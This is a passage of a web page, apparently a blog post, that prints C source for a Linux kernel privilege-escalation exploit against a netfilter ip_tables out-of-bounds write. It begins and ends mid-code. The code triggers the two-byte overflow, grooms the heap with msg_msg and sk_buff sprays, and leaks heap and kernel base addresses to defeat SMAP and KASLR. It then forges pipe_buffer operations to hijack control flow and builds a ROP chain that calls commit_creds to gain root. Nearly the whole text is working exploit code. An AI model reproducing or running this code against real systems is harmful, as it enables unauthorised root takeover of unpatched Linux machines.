class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trigger_oob_write</span><span class="params">(<span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>                     <span class="comment">// 0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>                         <span class="comment">// 0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>                    <span class="comment">// 0x20</span></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];   <span class="comment">//  kvmalloc_size = sizeof(xt_table_info) + ipt_replace-&gt;size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>                  <span class="comment">// 0x20</span></span><br><span class="line">  &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">  data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">  data.replace.size = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));             <span class="comment">// 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2</span></span><br><span class="line"></span><br><span class="line">  data.entry.next_offset = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));        <span class="comment">// Size of ipt_entry + matches + target</span></span><br><span class="line">  data.entry.target_offset =</span><br><span class="line">      (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));         <span class="comment">// Size of ipt_entry + matches</span></span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size = (<span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));   <span class="comment">// 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">  data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);                     <span class="comment">// 0x20</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">  data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOPROTOOPT) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error ip_tables module is not loaded.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//bind the cpu0</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">  CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> pipefd[NUM_PIPEFDS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> msqid[NUM_MSQIDS];</span><br><span class="line">  <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line">  <span class="keyword">char</span> secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">fake_pipe_buffer_ops</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buffer</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> pipe_buffer_ops = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span> kheap_addr = <span class="number">0</span>, kbase_addr = <span class="number">0</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fake_idx = <span class="number">-1</span>, real_idx = <span class="number">-1</span>;</span><br><span class="line">  saveStatus();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up namespace sandbox...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setup_sandbox() &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Initializing sockets and message queues...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, ss[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] socketpair&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1. two bytes null write -&gt; UAF</span></span><br><span class="line"><span class="comment">// 1-1. gain 4096 msg queue</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] msgget&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">//1-2. create 4096 primary msg —— size=0x1000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_primary, <span class="string">&#x27;\xdd&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-3. create 4096 secondary msg —— size=0x400</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_secondary, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_secondary));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">                  MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-4. release #1024/#2048/#3072 msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating holes in primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">        <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering out-of-bounds write...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (trigger_oob_write(s) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1-6. find which msg is corrupted</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching for corrupted primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; (i % HOLE_STEP) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] != MSG_TAG) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] != i) &#123;</span><br><span class="line">      fake_idx = i;</span><br><span class="line">      real_idx = *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_idx == <span class="number">-1</span> &amp;&amp; real_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_idx&#x27;s primary message has a corrupted next pointer; wrongly pointing to real_idx&#x27;s secondary message.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_idx: 0x%x\n&quot;</span>, fake_idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] real_idx: 0x%x\n&quot;</span>, real_idx);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. leak secondary msg address (kmalloc-0x400) -&gt; to forge `msg_msg-&gt;m_list-&gt;next &amp; prev`</span></span><br><span class="line"><span class="comment">// 2-1. free overlapped msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing real secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[real_idx], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">               MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.</span></span><br><span class="line"><span class="comment">// 2-2. spray and forge msg_msg (forge larger msg_msg-&gt;m_ts)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                PAGE_SIZE - MSG_MSG_SIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 2-2. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x1000)</span></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read out-of-bounds.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking adjacent secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak adjacent secondary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The secondary message contains a pointer to the primary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (PRIMARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF000000000000</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 2-3. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x400)  (forge msg_msg-&gt;next)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Put kheap_addr at next to leak its content. Assumes zero bytes before</span></span><br><span class="line">  <span class="comment">// kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                <span class="keyword">sizeof</span>(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      <span class="comment">// fist 8 bytes must be NULL</span></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read from kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The primary message contains a pointer to the secondary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (SECONDARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the address of the fake secondary message.</span></span><br><span class="line">  kheap_addr -= SECONDARY_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF00000000FFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3. leak kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3-1. forge `msg_msg-&gt;m_list-&gt;next &amp; prev` so that list_del() does not crash.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, kheap_addr, kheap_addr, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-2. free secondary msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing sk_buff data buffer...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), MTYPE_FAKE) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-3. spray pipe_buffer object</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] pipe&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write something to populate pipe_buffer.</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipefd[i][<span class="number">1</span>], <span class="string">&quot;pwn&quot;</span>, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3-4. leak pipe_buffer-&gt;ops —— kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_rmid;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>] != MTYPE_FAKE)</span><br><span class="line">        pipe_buffer_ops = *(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">  kbase_addr = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] anon_pipe_buf_ops: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, pipe_buffer_ops);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kbase_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kbase_addr &amp; <span class="number">0xFFFF0000000FFFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel base address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 4. hijack control-flow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4-1. use skb to forge fake pipe_buffer</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//hijack rsp</span></span><br><span class="line">  fake_pipe_buffer = (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">  fake_pipe_buffer-&gt;ops = kheap_addr;</span><br><span class="line">  </span><br><span class="line">  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;</span><br><span class="line">  fake_pipe_buffer_ops-&gt;release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  <span class="comment">//</span></span><br><span class="line">  fake_pipe_buffer_ops-&gt;confirm = kernel_offset + ADD_RSP_0x98_RET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *mid_gadget;</span><br><span class="line">  mid_gadget = (<span class="keyword">uint64_t</span>*) (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0x2e</span>];</span><br><span class="line">  mid_gadget[<span class="number">0</span>] = kernel_offset + POP_RSP_RET;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4-2. construct ROP chain</span></span><br><span class="line">  <span class="comment">//build rop</span></span><br><span class="line">    <span class="keyword">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0xa0</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    